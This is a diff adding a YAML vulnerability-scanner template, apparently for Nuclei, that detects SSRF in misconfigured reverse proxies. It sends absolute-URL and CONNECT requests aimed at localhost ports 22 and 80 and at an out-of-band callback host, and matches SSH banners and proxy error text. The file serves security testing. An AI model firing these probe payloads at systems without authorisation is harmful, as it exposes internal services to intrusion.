@@ -1,0 +1,146 @@
+id: ssrf-via-proxy-fuzz-enhanced-fixed
+
+info:
+  name: SSRF via Proxy Misconfiguration (Enhanced Fuzz)
+  author: iman,refined,codex
+  severity: high
+  description: |
+    Detects reverse proxy misconfigurations that allow the request target to be
+    replaced with an absolute URL or CONNECT authority target, enabling SSRF to
+    localhost services or interactsh-based out-of-band callbacks.
+  reference:
+    - https://docs.projectdiscovery.io/templates/protocols/http/http-payloads
+    - https://docs.projectdiscovery.io/templates/protocols/http/unsafe-http
+    - https://docs.projectdiscovery.io/templates/reference/oob-testing
+  metadata:
+    max-request: 13
+    verified: true
+  tags: ssrf,proxy,oast,fuzz,unsafe
+
+http:
+  - raw:
+      - |+
+        {{method}} {{fuzz_url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    unsafe: true
+    attack: clusterbomb
+    payloads:
+      method:
+        - GET
+        - POST
+      fuzz_url:
+        - "http://127.0.0.1:22"
+        - "http://127.0.0.1:80"
+        - "http://localhost:22"
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: ssh-echo
+        part: body
+        words:
+          - "SSH-"
+          - "OpenSSH"
+          - "Protocol mismatch"
+        condition: or
+
+      - type: word
+        name: proxy-error
+        part: body
+        words:
+          - "failed to connect to 127.0.0.1"
+          - "failed to connect to localhost"
+          - "connection refused"
+          - "dial tcp 127.0.0.1:22"
+          - "dial tcp 127.0.0.1:80"
+          - "dial tcp [::1]:80"
+        condition: or
+
+  - raw:
+      - |+
+        GET http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    unsafe: true
+    stop-at-first-match: false
+    matchers:
+      - type: word
+        name: oast-absolute-url
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  - raw:
+      - |+
+        POST http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+        Connection: close
+
+    unsafe: true
+    stop-at-first-match: false
+    matchers:
+      - type: word
+        name: oast-absolute-url-post
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  - raw:
+      - |+
+        CONNECT {{connect_target}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    unsafe: true
+    payloads:
+      connect_target:
+        - "127.0.0.1:22"
+        - "127.0.0.1:80"
+        - "localhost:80"
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: connect-ssh-echo
+        part: body
+        words:
+          - "SSH-"
+          - "OpenSSH"
+          - "Protocol mismatch"
+        condition: or
+
+      - type: word
+        name: connect-success-or-error
+        part: raw
+        words:
+          - "200 Connection established"
+          - "200 connection established"
+          - "502 Bad Gateway"
+          - "504 Gateway Timeout"
+          - "Connection refused"
+        condition: or
+
+  - raw:
+      - |+
+        CONNECT {{interactsh-url}}:80 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    unsafe: true
+    stop-at-first-match: false
+    matchers:
+      - type: word
+        name: oast-connect
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
